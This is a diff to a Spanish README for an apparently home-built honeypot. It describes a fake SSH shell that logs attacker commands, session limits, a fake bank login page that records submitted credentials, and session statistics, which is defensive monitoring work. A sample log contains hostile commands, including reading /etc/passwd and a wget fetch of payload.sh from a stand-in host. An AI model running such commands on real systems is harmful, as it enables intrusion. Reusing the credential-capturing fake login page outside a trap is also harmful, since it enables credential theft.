@@ -73,7 +73,11 @@ texto**, no un servidor SSH real: un `ssh` de verdad no entra. Al conectar:
    barrera: es una cámara. Si bloqueara al atacante no sabríamos qué viene después.
 4. Entrega un shell falso (`root@victima:~# `) que responde a `uname -a`, `whoami`, `id`,
    `ls`, `cat /etc/passwd`, `pwd`, `wget`/`curl` y `exit`. Todas las órdenes quedan
-   registradas.
+   registradas. Una descarga simulada deja el mensaje real de `wget` (`Saving to: ...`,
+   `200 OK`) y se anota el archivo, los bytes y la herramienta.
+5. **Límites de sesión**: máximo 10 credenciales por sesión y 5 minutos de inactividad.
+   Si el atacante se pasa o se queda callado, la sesión se cierra y queda anotado
+   (`limite_intentos`, `sesion_timeout`).
 
 **Trampa web** (puerto 8080 por defecto). `GET /` devuelve un login falso de banco; el
 `POST /login` registra usuario y contraseña y responde siempre «Sesión iniciada»: **no
@@ -90,6 +94,10 @@ Sesión 1 · ssh · 127.0.0.1:47956 · 14 eventos · 0s
   Órdenes (7): uname -a; whoami; id; ls; cat /etc/passwd; wget http://198.51.100.7/payload.sh; exit
   Descargas: http://198.51.100.7/payload.sh
 ```
+
+El visor además agrega **estadísticas** de todas las sesiones: cuántas hubo, cuántos
+intentos de acceso, cuántas órdenes, cuántas descargas, cuántos clics en la web, cuántas IP
+distintas, los usuarios más intentados y las órdenes más usadas.
 
 En crudo:
 
@@ -134,7 +142,7 @@ honeypot-casero/
 ## Verificación
 
 ```bash
-cargo test                                              # 33 pruebas
+cargo test                                              # 38 pruebas
 cargo clippy --all-targets -- -D warnings
 cargo fmt -- --check
 ```
